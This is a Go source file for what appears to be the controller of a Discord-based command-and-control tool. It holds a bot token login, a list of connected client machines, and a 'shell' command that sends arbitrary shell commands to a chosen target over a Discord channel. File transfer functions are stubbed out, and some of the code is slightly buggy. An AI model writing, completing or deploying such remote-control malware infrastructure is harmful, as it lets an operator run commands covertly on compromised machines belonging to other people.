package main

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/brnlee/DiscordGo_CC/discord"
	"github.com/bwmarrin/discordgo"
	"github.com/google/uuid"
)

type Job struct {
	id   uuid.UUID
	cmd  string
	time string
}

var clients = make(map[string]time.Time)
var jobs []Job

func main() {
	println("Attempting to create new session")
	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + discord.MasterToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	//<-sc

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		input := scanner.Text()
		if len(input) == 0 {
			continue
		}
		var action string
		_, err = fmt.Sscanf(input, "%s", &action)
		switch action {
		case "jobs":
			if len(input) == len(action) {
				listJobs()
			}
		case "clients":
			fmt.Println("Listing Clients")
			if len(input) == len(action) {
				listClients()
			}
		case "shell":
			var target string
			var command string
			n, err := fmt.Sscanf(input, "shell %s %q", &target, &command)
			if err != nil || n != 2 {
				println("Incorrect \"shell\" arguments", err.Error())
				continue
			}
			executeShellCommand(target, command, dg)
			addJobToQueue(input)
		case "sendf":
			fmt.Println("Sending file")
		case "savef":
			fmt.Println("Downloading file")
		default:
			fmt.Printf("%s is not a valid command.\n", input)
			continue
		}
	}

	fmt.Println("\nClosing")
	// Cleanly close down the Discord session.
	e := dg.Close()
	if e != nil {
		println("There was an error closing the Discord session connection.")
	}
	fmt.Println("Closed")
}

func listJobs() {
	println("Recently Executed Jobs:")
	for _, job := range jobs {
		fmt.Printf("JobID: %s\tTimestamp: %s\tCommand: %s\n", job.id, job.time, job.cmd)
	}
}
func listClients() {
	println("Currently Connected Clients:")
	for clientId, timestamp := range clients {
		fmt.Printf("JobID: %s\tTime since last ping (s):%d\n", clientId, time.Now().Sub(timestamp)*1000)
	}
}

func executeShellCommand(target string, command string, dg *discordgo.Session) {
	message := fmt.Sprintf("%s\n%s\n%s", "shell", target, command)
	discord.SendMessage(dg, message)
}

func sendFile(target string, filename string) {

}

func downloadFile(filename string) {

}

// This function will be called (due to AddHandler above) every time a new
// message is created on any channel that the autenticated bot has access to.
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {

	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	if m.Author.ID == s.State.User.ID {
		return
	}
	// If the message is "ping" reply with "Pong!"
	if m.Content == "ping" {
		discord.SendMessage(s, "Pong!")
	}

	// If the message is "pong" reply with "Ping!"
	if m.Content == "pong" {
		discord.SendMessage(s, "Ping!")
	}
}

func addJobToQueue(command string) {
	job := Job{id: uuid.New(), cmd: command, time: time.Now().Format("Jan 02 15:04:05")}
	if len(jobs) == 5 {
		jobs[0] = Job{}
		jobs = append(jobs[1:], job)
	} else {
		jobs = append(jobs, job)
	}
}
